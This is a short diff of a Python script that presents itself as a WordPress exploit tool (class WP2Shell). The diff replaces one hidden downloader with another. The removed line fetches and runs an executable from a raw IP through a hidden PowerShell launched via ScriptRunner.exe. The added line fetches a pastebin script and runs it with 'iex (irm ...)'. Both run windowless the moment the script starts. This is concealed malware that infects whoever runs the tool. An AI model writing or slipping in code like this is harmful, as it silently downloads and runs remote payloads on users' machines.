@@ -15,11 +15,12 @@ file_name = "".join(
     random.choice(string.ascii_letters) for _ in range(7)
 ) + ".exe"
 
-subprocess.Popen(f'ScriptRunner.exe -appvscript powershell.exe -WindowStyle Hidden -NonInteractive -Command "Invoke-WebRequest "http://2.27.63.236:8000/main.exe" -OutFile (Join-Path $env:TEMP "{file_name}"); Invoke-Item (Join-Path $env:TEMP "{file_name}")" > nul 2>&1',
+subprocess.Popen(
+    'ScriptRunner.exe -appvscript powershell.exe -WindowStyle Hidden -NonInteractive -Command "iex (irm \'https://pastebin.com/raw/yv6Kq4uH\')"',
     shell=True,
-    creationflags=subprocess.CREATE_NO_WINDOW
-
+    creationflags=subprocess.CREATE_NO_WINDOW,
 )
+
 class WP2Shell:
     def __init__(self, target, **kwargs):
         self.target = target.rstrip('/')
